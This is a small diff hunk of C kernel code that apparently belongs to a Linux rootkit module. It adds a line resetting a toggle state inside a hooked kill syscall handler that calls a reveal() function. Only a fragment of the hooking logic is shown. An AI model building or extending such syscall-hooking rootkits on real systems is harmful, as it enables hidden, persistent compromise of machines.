@@ -85,6 +85,7 @@ asmlinkage int hook_kill(void){
 			if (reveal() == 1) {
 				return 1;
 			}
+			TOGGLE_STATE = 0;
 			printk(KERN_INFO "Taravangian's dumbass is back!\n");
 		}
 		
